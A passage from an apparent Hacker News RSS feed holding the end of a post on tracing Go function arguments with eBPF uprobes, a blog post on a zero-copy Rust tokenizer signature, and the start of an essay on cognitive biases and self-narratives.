src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yMC4zMzYgNUg4LjA0OEM2LjkxNjQ4IDUgNiA1LjkxNjQ4IDYgNy4wNDhWMjEuMzg0SDguMDQ4VjcuMDQ4SDIwLjMzNlY1Wk0yMy40MDggOS4wOTZIMTIuMTQ0QzExLjAxMjUgOS4wOTYgMTAuMDk2IDEwLjAxMjUgMTAuMDk2IDExLjE0NFYyNS40OEMxMC4wOTYgMjYuNjExNSAxMS4wMTI1IDI3LjUyOCAxMi4xNDQgMjcuNTI4SDIzLjQwOEMyNC41Mzk1IDI3LjUyOCAyNS40NTYgMjYuNjExNSAyNS40NTYgMjUuNDhWMTEuMTQ0QzI1LjQ1NiAxMC4wMTI1IDI0LjUzOTUgOS4wOTYgMjMuNDA4IDkuMDk2Wk0xMi4xNDQgMjUuNDhIMjMuNDA4VjExLjE0NEgxMi4xNDRWMjUuNDhaIiBmaWxsPSIjNEE0QzRGIi8+Cjwvc3ZnPgo=" alt="" title="Copy to clipboard" aria-label="copy"></p></div></pre><p>To understand how uprobes work, let's look at how symbols are tracked inside binaries. Since uprobes work by inserting a debug trap instruction, we need to get the address where the function is located. Go binaries on Linux use ELF to store debug info. This information is available, even in optimized binaries, unless debug data has been stripped. We can use the command <code>objdump</code> to examine the symbols in the binary:</p><pre><div><p><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yMC4zMzYgNUg4LjA0OEM2LjkxNjQ4IDUgNiA1LjkxNjQ4IDYgNy4wNDhWMjEuMzg0SDguMDQ4VjcuMDQ4SDIwLjMzNlY1Wk0yMy40MDggOS4wOTZIMTIuMTQ0QzExLjAxMjUgOS4wOTYgMTAuMDk2IDEwLjAxMjUgMTAuMDk2IDExLjE0NFYyNS40OEMxMC4wOTYgMjYuNjExNSAxMS4wMTI1IDI3LjUyOCAxMi4xNDQgMjcuNTI4SDIzLjQwOEMyNC41Mzk1IDI3LjUyOCAyNS40NTYgMjYuNjExNSAyNS40NTYgMjUuNDhWMTEuMTQ0QzI1LjQ1NiAxMC4wMTI1IDI0LjUzOTUgOS4wOTYgMjMuNDA4IDkuMDk2Wk0xMi4xNDQgMjUuNDhIMjMuNDA4VjExLjE0NEgxMi4xNDRWMjUuNDhaIiBmaWxsPSIjNEE0QzRGIi8+Cjwvc3ZnPgo=" alt="" title="Copy to clipboard" aria-label="copy"></p></div></pre><p>From the output, we know that the function <code>computeE</code> is located at address <code>0x6609a0</code>. To look at the instructions around it, we can ask <code>objdump</code> to disassemble to binary (done by adding <code>-d</code>). The disassembled code looks like:</p><pre><div><p><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yMC4zMzYgNUg4LjA0OEM2LjkxNjQ4IDUgNiA1LjkxNjQ4IDYgNy4wNDhWMjEuMzg0SDguMDQ4VjcuMDQ4SDIwLjMzNlY1Wk0yMy40MDggOS4wOTZIMTIuMTQ0QzExLjAxMjUgOS4wOTYgMTAuMDk2IDEwLjAxMjUgMTAuMDk2IDExLjE0NFYyNS40OEMxMC4wOTYgMjYuNjExNSAxMS4wMTI1IDI3LjUyOCAxMi4xNDQgMjcuNTI4SDIzLjQwOEMyNC41Mzk1IDI3LjUyOCAyNS40NTYgMjYuNjExNSAyNS40NTYgMjUuNDhWMTEuMTQ0QzI1LjQ1NiAxMC4wMTI1IDI0LjUzOTUgOS4wOTYgMjMuNDA4IDkuMDk2Wk0xMi4xNDQgMjUuNDhIMjMuNDA4VjExLjE0NEgxMi4xNDRWMjUuNDhaIiBmaWxsPSIjNEE0QzRGIi8+Cjwvc3ZnPgo=" alt="" title="Copy to clipboard" aria-label="copy"></p></div></pre><p>From this we can see what happens when <code>computeE</code> is called. The first instruction is <code>mov 0x8(%rsp),%rax</code>. This moves the content offset <code>0x8</code> from the <code>rsp</code> register to the <code>rax</code> register. This is actually the input argument <code>iterations</code> above; Go's arguments are passed on the stack.</p><p>With this information in mind, we are now ready to dive in and write code to trace the arguments for <code>computeE</code>.</p><p>To capture the events, we need to register a uprobe function and have a userspace function that can read the output. A diagram of this is shown below. We will write a binary called <code>tracer</code> that is responsible for registering the BPF code and reading the results of the BPF code. As shown, the uprobe will simply write to a perf-buffer, a linux kernel data structure used for perf events.</p><div><figure><img src="https://blog.pixielabs.ai/static/9f8b26f88f9b132440ef1b9d48b5a341/app-tracer.svg"><figcaption>High-level overview showing the Tracer binary listening to perf events generated from the App</figcaption></figure></div><p>Now that we understand the pieces involved, let's look into the details of what happens when we add an uprobe. The diagram below shows how the binary is modified by the Linux kernel with an uprobe. The soft-interrupt instruction (<code>int3</code>) is inserted as the first instruction in <code>main.computeE</code>. This causes a soft-interrupt, allowing the Linux kernel to execute our BPF function. We then write the arguments to the perf-buffer, which is asynchronously read by the tracer.</p><div><figure><img src="https://blog.pixielabs.ai/static/87301c7282e8f8270fee2afb9fe85c81/app-trace.svg"><figcaption>Details of how a debug trap instruction is used call a BPF program</figcaption></figure></div><p>The BPF function for this is relatively simple; the C code is shown below. We register this function so that it's invoked every time <code>main.computeE</code> is called. Once it's called, we simply read the function argument and write that the perf buffer. Lots of boilerplate is required to set up the buffers, etc. and this can be found in the complete example <a href="https://github.com/pixie-labs/pixie/blob/main/demos/simple-gotracing/trace_example/trace.go" target="_blank" rel="noopener noreferrer">here</a>.</p><pre><div><p><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yMC4zMzYgNUg4LjA0OEM2LjkxNjQ4IDUgNiA1LjkxNjQ4IDYgNy4wNDhWMjEuMzg0SDguMDQ4VjcuMDQ4SDIwLjMzNlY1Wk0yMy40MDggOS4wOTZIMTIuMTQ0QzExLjAxMjUgOS4wOTYgMTAuMDk2IDEwLjAxMjUgMTAuMDk2IDExLjE0NFYyNS40OEMxMC4wOTYgMjYuNjExNSAxMS4wMTI1IDI3LjUyOCAxMi4xNDQgMjcuNTI4SDIzLjQwOEMyNC41Mzk1IDI3LjUyOCAyNS40NTYgMjYuNjExNSAyNS40NTYgMjUuNDhWMTEuMTQ0QzI1LjQ1NiAxMC4wMTI1IDI0LjUzOTUgOS4wOTYgMjMuNDA4IDkuMDk2Wk0xMi4xNDQgMjUuNDhIMjMuNDA4VjExLjE0NEgxMi4xNDRWMjUuNDhaIiBmaWxsPSIjNEE0QzRGIi8+Cjwvc3ZnPgo=" alt="" title="Copy to clipboard" aria-label="copy"></p></div></pre><p>Now we have a fully functioning end-to-end argument tracer for the <code>main.computeE</code> function! The results of this are shown in the video clip below.</p><div><figure><img src="https://blog.pixielabs.ai/static/4de8713a5b05e1f9132350f333572174/e2e-demo.gif"><figcaption>End-to-End demo</figcaption></figure></div><p>One of the cool things is that we can actually use GDB to see the modifications made to the binary. Here we dump out the instructions at the <code>0x6609a0</code> address, before running our tracer binary.</p><pre><div><p><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yMC4zMzYgNUg4LjA0OEM2LjkxNjQ4IDUgNiA1LjkxNjQ4IDYgNy4wNDhWMjEuMzg0SDguMDQ4VjcuMDQ4SDIwLjMzNlY1Wk0yMy40MDggOS4wOTZIMTIuMTQ0QzExLjAxMjUgOS4wOTYgMTAuMDk2IDEwLjAxMjUgMTAuMDk2IDExLjE0NFYyNS40OEMxMC4wOTYgMjYuNjExNSAxMS4wMTI1IDI3LjUyOCAxMi4xNDQgMjcuNTI4SDIzLjQwOEMyNC41Mzk1IDI3LjUyOCAyNS40NTYgMjYuNjExNSAyNS40NTYgMjUuNDhWMTEuMTQ0QzI1LjQ1NiAxMC4wMTI1IDI0LjUzOTUgOS4wOTYgMjMuNDA4IDkuMDk2Wk0xMi4xNDQgMjUuNDhIMjMuNDA4VjExLjE0NEgxMi4xNDRWMjUuNDhaIiBmaWxsPSIjNEE0QzRGIi8+Cjwvc3ZnPgo=" alt="" title="Copy to clipboard" aria-label="copy"></p></div></pre><p>Here it is after we run the tracer binary. We can clearly see that the first instruction is now <code>int3</code>.</p><pre><div><p><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yMC4zMzYgNUg4LjA0OEM2LjkxNjQ4IDUgNiA1LjkxNjQ4IDYgNy4wNDhWMjEuMzg0SDguMDQ4VjcuMDQ4SDIwLjMzNlY1Wk0yMy40MDggOS4wOTZIMTIuMTQ0QzExLjAxMjUgOS4wOTYgMTAuMDk2IDEwLjAxMjUgMTAuMDk2IDExLjE0NFYyNS40OEMxMC4wOTYgMjYuNjExNSAxMS4wMTI1IDI3LjUyOCAxMi4xNDQgMjcuNTI4SDIzLjQwOEMyNC41Mzk1IDI3LjUyOCAyNS40NTYgMjYuNjExNSAyNS40NTYgMjUuNDhWMTEuMTQ0QzI1LjQ1NiAxMC4wMTI1IDI0LjUzOTUgOS4wOTYgMjMuNDA4IDkuMDk2Wk0xMi4xNDQgMjUuNDhIMjMuNDA4VjExLjE0NEgxMi4xNDRWMjUuNDhaIiBmaWxsPSIjNEE0QzRGIi8+Cjwvc3ZnPgo=" alt="" title="Copy to clipboard" aria-label="copy"></p></div></pre><p>Although we hardcoded the tracer for this particular example, it's possible to make this process generalizable. Many aspects of Go, such as nested pointers, interfaces, channels, etc. make this process challenging, but solving these problems allows for another instrumentation mode not available in existing systems. Also, since this process works at the binary level, it can be used with natively compiled binaries for other languages (C++, Rust, etc.). We just need to account for the differences in their respective ABI's.</p><p>BPF tracing using uprobes comes with its own set of pros and cons. It's beneficial to use BPF when we need observability into the binary state, even when running in environments where attaching a debugger will be problematic or harmful (ex. production binaries). The biggest downside is the code required to get even trivial visibility into the application state. While BPF code is relatively accessible, it's complex to write and maintain. Without substantial high-level tooling, it's unlikely this can be used for generic debugging.</p><div><figure><img src="https://blog.pixielabs.ai/static/12645e1cb582041085ede1877e97c812/wavingnaut.svg"><figcaption></figcaption></figure></div><p>Go dynamic logging is something we are working on at Pixie. You can checkout <a href="https://docs.pixielabs.ai/tutorials/simple-go-tracing/" target="_blank" rel="noopener noreferrer">this</a> to see how Pixie traces Go applications running on K8s clusters. If this post's contents are interesting, please give <a href="https://pixielabs.ai/" target="_blank" rel="noopener noreferrer">Pixie</a> a try, or check out our <a href="https://pixielabs.ai/career" target="_blank" rel="noopener noreferrer">open positions</a>.</p><h2>References</h2><ul><li><a href="https://github.com/iovisor/gobpf" target="_blank" rel="noopener noreferrer">iovisor/gobpf</a></li><li><a href="https://github.com/iovisor/bcc" target="_blank" rel="noopener noreferrer">iovisor/bcc</a></li><li>GoPoland Meetup <a href="https://www.youtube.com/watch?v=SlcBq3xDc7I" target="_blank" rel="noopener noreferrer">Video</a> + <a href="https://www.slideshare.net/ZainAsgar/go-logging-using-ebpf" target="_blank" rel="noopener noreferrer">Slides</a></li><li>GoBangalore Meetup <a href="https://www.youtube.com/watch?v=0mxUU_--dDM&amp;feature=youtu.be" target="_blank" rel="noopener noreferrer">Video</a>. Checkout Below:</li></ul><iframe width="560" height="315" src="https://www.youtube.com/embed/0mxUU_--dDM?start=15" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></div></div></div></div>]]>
            </description>
            <link>https://blog.pixielabs.ai/blog/ebpf-function-tracing/post/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24505862</guid>
            <pubDate>Thu, 17 Sep 2020 15:30:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Favorite Rust Function Signature]]>
            </title>
            <description>
<![CDATA[
Score 237 | Comments 115 (<a href="https://news.ycombinator.com/item?id=24505436">thread link</a>) | @brundolf
<br/>
September 17, 2020 | https://www.brandonsmith.ninja/blog/favorite-rust-function | <a href="https://web.archive.org/web/*/https://www.brandonsmith.ninja/blog/favorite-rust-function">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody">
      

      

      

      


      <p>I've gotten really into writing parsers lately, and Rust has turned out to be
        the perfect language for that. In the course of my adventures, I came up with
        the following:</p>
      <pre><code><span>fn</span> tokenize<span>&lt;</span><span>'a</span><span>&gt;</span><span>(</span>code<span>:</span> <span>&amp;</span><span>'a</span> str<span>)</span> <span>-&gt;</span> <span>impl</span> Iterator<span>&lt;</span>Item<span>=</span><span>&amp;</span><span>'a</span> str<span>&gt;</span> <span>{</span>
  <span>...</span>
<span>}</span>
</code></pre>
      <p>and it really deepened my appreciation for Rust.</p>
      <h2 id="what-does-this-function-do%3F">What does this function do? </h2>
      <p>For those not familiar with parsing, tokenization is the first step of the
        process. It takes a raw code string, like this:</p>
      <pre><code>let a = "foo";
</code></pre>
      <p>and turns it into a linear series of meaningful tokens, like so:</p>
      <pre><code>["let", "a", "=", "\"foo\"", ";"]
</code></pre>
      <p>This phase isn't terribly complicated, but it simplifies the mental model for
        the next pass: constructing an "abstract syntax tree". It removes whitespace
        from the equation, bundles up segments like strings and numbers, and just
        generally makes the code in the next pass cleaner.</p>
      <p>The downside is that, if you perform this as a separate pass, your parser now
        has to iterate over all of the source code <em>twice</em>. This may not be the end of
        the world: tokenizing isn't the most expensive operation. But it isn't ideal,
        so some parsers combine the two passes into a single one, saving cycles at the
        expense of readability.</p>
      <h2 id="what's-going-on-in-the-rust-version%3F">What's going on in the Rust version? </h2>
      <p>I'll copy the signature here again for reference:</p>
      <pre><code><span>fn</span> tokenize<span>&lt;</span><span>'a</span><span>&gt;</span><span>(</span>code<span>:</span> <span>&amp;</span><span>'a</span> str<span>)</span> <span>-&gt;</span> <span>impl</span> Iterator<span>&lt;</span>Item<span>=</span><span>&amp;</span><span>'a</span> str<span>&gt;</span> <span>{</span>
  <span>...</span>
<span>}</span>
</code></pre>
      <p>There are several things going on here.</p>
      <p><code>&amp;str</code>, in Rust, is a "string slice". It's effectively a character pointer and a
        length. The contents of the slice are guaranteed to be in valid, alive memory.
        <code>&amp;'a str</code> is a string slice <em>with a lifetime</em>. The lifetime <code>'a</code>, to be
        exact. This lifetime describes a limited span of time in which the
        reference (and the full contents of the slice) are guaranteed to be in valid,
        alive memory. More on this later.</p>
      <p><code>Iterator&lt;Item=&amp;'a str&gt;</code> is an iterator over elements of type <code>&amp;'a str</code>. This
        is a <em>trait</em>, though, not a concrete type. Rust needs a concrete type with a
        fixed size when you're defining something like a function, but luckily we can
        say <code>impl Iterator&lt;Item=&amp;'a str&gt;</code>, which tells Rust, "fill in some type that
        implements <code>Iterator&lt;Item=&amp;'a str&gt;</code>, to be inferred at compile-time". This is
        very helpful because in Rust there are lots and lots of different concrete types
        for <code>Iterator</code>; applying something like a <code>map()</code> or a <code>filter()</code> returns a whole
        new concrete type. So this way, we don't have to worry about keeping the
        function signature up to date as we work on the logic.</p>
      <h2 id="so-what's-so-great-about-all-this%3F">So what's so great about all this? </h2>
      <p>Okay, so we have a function that takes a reference to a string slice and returns
        an iterator over string slices. Why's that special? There are two reasons.</p>
      <h3 id="iterators-let-you-treat-one-pass-like-it's-two">Iterators let you treat one pass like it's two </h3>
      <p>Remember how I said you traditionally have to pick between doing a separate
        tokenization pass, and doing a single pass with all the logic interleaved? With
        an iterator, you can have the best of both worlds.</p>
      <p>When this function completes, it hasn't yet iterated over the string. It hasn't
        allocated any kind of collection in memory. It returns a structure that's
        <em>prepared</em> to iterate over the input string slice and produce a sequence of new
        slices. When this value later gets <code>map()</code>ed into something else, or
        <code>filter()</code>ed, or any other <code>Iterator</code> transformations get applied, the stages
        of the process get interleaved, and the "loops" effectively get folded into a
        single one. By doing this, we're able to get the clean abstraction of a
        tokenizing "pass" without the runtime overhead of a second loop!</p>
      <p>But other languages have iterators. Rust's may be extra powerful and ergonomic,
        but they aren't a totally unique feature. The next part is very much unique to
        Rust.</p>
      
      <p>The <code>tokenize()</code> function doesn't allocate any new memory for a collection of
        tokens. That's great. But what may be less obvious is that it <em>also</em> doesn't
        allocate any memory for the tokens themselves! Each string slice representing a
        token is a <em>direct pointer to part of the original string</em>.</p>
      <p>You can do this in C/C++, of course, but there's a danger: if those tokens are
        ever accessed after the original code string has been freed, you'll have a
        memory error.</p>
      <p>For example: let's say you open a file and load the source code from it, and
        store the result in a local variable. Then you <code>tokenize()</code> it and send the
        tokens on to somewhere else outside of the function where the original string
        lived. Voilà, you've got a <a href="https://en.wikipedia.org/wiki/Dangling_pointer">use-after-free error</a>.</p>
      <p>One way to guard against this is by copying each string segment into a <em>new</em>
        string, allocated on the heap, which allows you to safely pass it on after the
        original string is gone. But this comes with a cost: creating, copying, and
        eventually disposing of each of those new strings takes time (and memory). Code
        down the line also has to be aware that it's responsible for de-allocating those
        strings, otherwise they'll leak.</p>
      <p>This is where the magic of lifetimes comes into play.</p>
      <p>Rust prevents the above situation entirely. Normally, though, to accomplish this
        a <code>&amp;str</code> coming into a function from elsewhere must be assumed to be <em>static</em>,
        or to be alive for the entire duration of the program's execution. This is the
        status assigned to, for example, a string literal that you've manually entered
        into your Rust code. Rust doesn't know, in the context of the function, how
        long that reference will be valid, so it must be pessimistic.</p>
      <p><strong>But.</strong> That little <code>'a</code> says: "these things all live for the same span of time". We
        can <em>assert</em> that the original source code string lives at least as long as the
        <em>tokens</em> that reference it. By doing so, Rust can reason about whether or not
        those resulting token references are valid at a given point, and therefore
        doesn't have to assume them to be static! We can do <em>whatever we want</em> with
        those tokens and the compiler will guarantee that they always point to something
        valid, even if the source code is loaded in dynamically at runtime (from a file
        or otherwise). If we find out later via a compiler error that they really do
        need to outlive the source string, then we can copy them ("take ownership") at
        that point. If the compiler doesn't force us to do so, we know we're safe,
        and we know we can continue using the most efficient possible approach,
        <em>fearlessly</em>.</p>
      <p>What we've effectively done is written the most optimistic possible function
        (in terms of memory safety), with no downsides, because the Rust compiler will
        tell us if we're misusing it and force us to then "step down" to whatever level
        of extra accommodation is needed.</p>
      <h2 id="conclusion">Conclusion </h2>
      <p>I've been using (and loving) Rust for about a year and a half now. And there are
        many things to love, but when I got this function working I immediately saw it
        as a microcosm of what really sets the language apart. This is something that
        you <strong>cannot do</strong> both a) this safely and b) this efficiently <strong>in any other
language</strong>. This is the power of Rust.</p>


    </article></div>]]>
            </description>
            <link>https://www.brandonsmith.ninja/blog/favorite-rust-function</link>
            <guid isPermaLink="false">hacker-news-small-sites-24505436</guid>
            <pubDate>Thu, 17 Sep 2020 15:00:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The stories we tell ourselves]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24505291">thread link</a>) | @ochronus
<br/>
September 17, 2020 | https://ochronus.online/stories-we-tell-ourselves/ | <a href="https://web.archive.org/web/*/https://ochronus.online/stories-we-tell-ourselves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
<figure>
    <picture>
        <source type="image/webp" media="(max-width: 400px)" srcset="https://ochronus.online/post-images/responsive/300/the-stories-we-tell-ourselves.webp" alt="The stories we tell ourselves matter">
        <source type="image/webp" media="(max-width: 800px)" srcset="https://ochronus.online/post-images/responsive/600/the-stories-we-tell-ourselves.webp" alt="The stories we tell ourselves matter">
        <source type="image/webp" media="(max-width: 1400px)" srcset="https://ochronus.online/post-images/responsive/1000/the-stories-we-tell-ourselves.webp" alt="The stories we tell ourselves matter">
        <source type="image/webp" media="(max-width: 1900px)" srcset="https://ochronus.online/post-images/responsive/1600/the-stories-we-tell-ourselves.webp" alt="The stories we tell ourselves matter">
        <source type="image/webp" media="(min-width: 2000px)" srcset="https://ochronus.online/post-images/responsive/2000/the-stories-we-tell-ourselves.webp" alt="The stories we tell ourselves matter">

        <source type="image/jpeg" media="(max-width: 400px)" srcset="https://ochronus.online/post-images/responsive/300/the-stories-we-tell-ourselves.jpeg" alt="The stories we tell ourselves matter">
        <source type="image/jpeg" media="(max-width: 800px)" srcset="https://ochronus.online/post-images/responsive/600/the-stories-we-tell-ourselves.jpeg" alt="The stories we tell ourselves matter">
        <source type="image/jpeg" media="(max-width: 1400px)" srcset="https://ochronus.online/post-images/responsive/1000/the-stories-we-tell-ourselves.jpeg" alt="The stories we tell ourselves matter">
        <source type="image/jpeg" media="(max-width: 1900px)" srcset="https://ochronus.online/post-images/responsive/1600/the-stories-we-tell-ourselves.jpeg" alt="The stories we tell ourselves matter">
        <source type="image/jpeg" media="(min-width: 2000px)" srcset="https://ochronus.online/post-images/responsive/2000/the-stories-we-tell-ourselves.jpeg" alt="The stories we tell ourselves matter">


        <img src="https://ochronus.online/post-images/responsive/2000/the-stories-we-tell-ourselves.webp" alt="The stories we tell ourselves matter">
    </picture>
</figure>

<p>We have a mechanism that can conceive unhappiness, difficulty changing habits, relationship problems, frustration, anger, and disappointment. We are usually not aware, but it’s happening continuously and in all of us.</p>
<p><strong>It’s us unconsciously telling stories to ourselves.</strong></p>
<blockquote>
<p>“We tell ourselves stories in order to live…We look for the sermon in the suicide, for the social or moral lesson in the murder of five. We interpret what we see, select the most workable of the multiple choices. We live entirely, especially if we are writers, by the imposition of a narrative line upon disparate images, by the “ideas” with which we have learned to freeze the shifting phantasmagoria which is our actual experience.”
– <!-- raw HTML omitted --><em><strong>Joan Didion</strong>, The White Album</em><!-- raw HTML omitted --></p>
</blockquote>
<p>A good story can entertain, motivate, teach valuable lessons, and solidify good habits.</p>
<p>A bad story can demotivate, cause frustration and anger, and curb our capability to be fully ourselves.</p>
<p>These stories are not necessarily false but usually, they don’t tell the entire truth — just one perspective. Another person could look at the same situation and tell a very different story. Telling ourselves stories is natural — we all do it, all the time. There’s nothing inherently wrong with it. That said <strong><em>if we aren’t aware of this happening, we won’t understand how they shape our mood, actions, happiness, and relationships.</em></strong></p>
<h3 id="an-example-of-such-a-story">An example of such a story:</h3>
<p><strong>The event:</strong> You submitted a pull request for review after half a day of work. Another engineer asked you to change half of your code and to increase your test coverage.</p>
<blockquote>
<p><strong><em>Your story:</em></strong> A nitpicking a**hole commented on every single thing I did in that pull request; I guess he has nothing better to do. I wish people stopped blocking me from making progress. Why are they always making game of me?!</p>
</blockquote>
<blockquote>
<p><strong><em>The other engineer’s story:</em></strong> Some terrible code almost went live today; thank god I checked that pull request! Why does it always have to be me to watch quality? It’s so sad it’s only important to me in this whole company…</p>
</blockquote>
<blockquote>
<p><strong><em>A bystander’s story:</em></strong> Whoa, that was some tense back-and-forth in the comments of that pull request. I wish people were just nicer to each other; we all want to do a good job at the end of the day, right?</p>
</blockquote>
<h2 id="roots-of-these-stories">Roots of these stories</h2>
<p>The most common origins of these stories are cognitive biases, our self-image made by / combined with our limiting beliefs, and our fears.</p>
<h3 id="our-self-image-and-limiting-beliefs">Our self-image and limiting beliefs</h3>
<p>Ultimately we all have an idea about what kind of a person we are. This idea subconsciously influences how we think, react, and make decisions. The image is usually closely tied to our fundamental values and worldview. Most of us want to be <em>good persons</em> in the end. What ‘right’ is is defined by these very values and core beliefs.
Our self-image influences the stories we tell ourselves because we’re looking for ways to find justification in our day-to-day experience.</p>
<p>Thus this image can limit our perceived set of options and understanding of the world around us.</p>
<p>Related to the personas in the previous example:</p>
<ul>
<li>I’m the guy who gets things done (<em>might imply that I think others are slowpokes</em>)</li>
<li>As a professional software engineer I am the sole guardian of quality in the company (<em>might imply that I think others are careless or unprofessional</em>)</li>
<li>I’m the kind of person who cares for others' feelings (<em>might imply that I think others have lower EQ</em>)</li>
</ul>
<p>Of course these are simply bits and pieces of the whole image.</p>
<p>In all of the narratives above there are (hopefully unfounded) assumptions, lots of jumping to conclusions and unproductive, limiting language. In this particular situation, this locks the actors in the status quo, lowering the hope for change. It feels like a stalemate unless someone is willing to be more open.</p>
<p>By the way I’ve written a bit about this earlier in the post titled <a href="https://ochronus.online/this-is-how-i-am/"><em>This is how I am</em></a></p>
<h3 id="our-fears">Our fears</h3>
<p>Fear also changes the kind of stories you tell yourself. Living in fear means giving up agency, seeing yourself as a passive spectator or a victim. It means seeing yourself as being controlled by circumstances, the actions of others, or your own emotions. And once the story you tell yourself becomes the story of a victim, you will be more and more likely to think and behave like a victim.</p>
<h3 id="cognitive-biases">Cognitive biases</h3>
<p>A cognitive bias is a systematic pattern of deviation from norm or rationality in judgment.
They are basically ‘shortcuts’ our brains take so it can increase our mental efficiency by enabling us to make quick decisions without any conscious deliberation.
Cognitive biases impact us in many areas of life, including social situations, memory recall, what we believe, and our behavior.</p>
<p>Some relevant and common cognitive biases from the staggering list of more than 180:</p>
<h4 id="self-serving-bias">Self-serving bias</h4>
<p>Self-serving bias is our tendency to blame external forces when bad things happen and give ourselves credit when good things happen. Although it can mean evading personal responsibility for your actions, self-serving bias is a defense mechanism that protects your self-esteem. In the example above, this means that if your pull request gets thumbs up from everyone, you attribute that to you being a fantastic engineer. On the other hand, if you get three comments asking you to change things, you might see others as nitpickers or your environment to be non-supportive instead of realizing you might have some room for improvement.</p>
<h4 id="confirmation-bias">Confirmation bias</h4>
<p>Confirmation bias, also known as confirmatory bias or the “myside bias,” is people’s tendency to seek out information that supports something they already believe. This type of bias affects our critical thinking, causing people to remember the hits and forget the misses — a flaw in human reasoning. People will often cue into things that matter to them (the things that support their own beliefs) and dismiss those that don’t. Think about the other engineer overly obsessed with test coverage.</p>

<p>The tendency to attribute greater weight and accuracy to an authority figure’s opinion is at play here. Authority bias is the tendency to blindly follow or believe the instructions and views of a person in authority. We have a deeply rooted sense of duty to obey authority. How do you react when you get a comment on your pull request from a senior engineer you respect? How about if you get the same comment from a junior who just recently started at the company?</p>
<h2 id="so-what-can-we-do-about-it">So what can we do about it?</h2>
<p>Don’t forget that <em>we are the storytellers</em> - we have full control over the stories we make up.
Everything starts with <strong>awareness</strong>.
Stories are part of the software of our brains. They influence how we act, what’s important, and what to do when something goes wrong. But every software program has bugs. Awareness is your first step towards debugging.</p>
<p>Stop from time to time and think about the possibility that the story you’ve just created is nothing more than a story. Consider alternative stories. Try telling the same story from other characters' side, think about what their narrative would look like.</p>
<p>Next time you find yourself in an upsetting situation, consider changing your story. Try this exercise:
Recognize and acknowledge any feelings of fear. Hint: you may need to look underneath your anger!
Ask yourself, what is it about this situation that is so upsetting? What do you believe to be “true” about it that feels threatening to you?
As pretty much anything else, fear can be tackled one step at a time. There are ways to re-learn to say what you mean and to do what you feel is right. The good news here is that self-reinforcement works both ways. Once you’ve practiced a bit and proven to yourself that it works (and that it’s less complicated than you thought), it gets easier to continue doing it.</p>
<p>We also must <strong>allow ourselves to be wrong.</strong> If we want to get closer to objective truths, we have to be able and ready to admit we were wrong, especially in the face of new data. If we can’t admit defeat, it makes us less capable of making discoveries in this world. We can avoid biases by being aware of our belief systems, whether our belief is for a religion, a political ideology, a cultural worldview, etc.. Let’s be open to disconfirmation, and allow ourselves to be wrong.</p>
<p>Self-compassion is an instrumental skill for reducing defensiveness and increasing your self-improvement motivation. It involves being kind and forgiving towards yourself, understanding that you are human and that other humans experience the same sort of experiences and failure and being able to identify uncomfortable thoughts without judging them.</p>
<blockquote>
<p>“Who are we but the stories we tell ourselves, about ourselves, and believe?“
– <!-- raw HTML omitted --><em><strong>Scott Turow</strong></em><!-- raw HTML omitted --></p>
</blockquote>
<h2 id="some-fuel-for-further-thoughts">Some fuel for further thoughts</h2>
<p>How do you look like as a character in others' stories? Do you like that character? What can you do so that character goes through some positive development?</p>
<h2 id="in-case-you-want-to-read-more-about-the-topics-in-this-article">In case you want to read more about the topics in this article:</h2>
<ul>
<li>I highly recommend <a href="http://www.ericberne.com/games-people-play/">‘Games People Play’ by Eric Berne</a> from 1964 and it’s sequel <a href="http://www.ericberne.com/what-do-you-say-after-you-say-hello/">‘What Do You Say After You Say Hello?'</a> from 1970. The book didn’t age particularly well regarding some topics but the basic principle holds.</li>
